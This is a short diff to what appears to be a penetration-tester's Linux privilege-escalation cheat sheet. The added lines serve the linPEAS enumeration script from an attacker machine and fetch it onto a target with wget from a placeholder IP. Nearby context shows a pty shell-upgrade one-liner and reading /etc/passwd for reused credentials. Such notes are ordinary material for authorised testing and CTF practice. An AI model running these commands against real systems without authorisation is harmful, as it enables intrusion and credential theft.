@@ -76,6 +76,9 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 Linux Path:
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
+cd /opt/privesc_scripts/linPEAS && http 8888
+wget <INSERTIPADDRESS>:8888/linPEAS.sh
+
 ## Users/Services/Credentials/Group Memebership
 Try for reused passwords across accounts:
 cat /etc/passwd
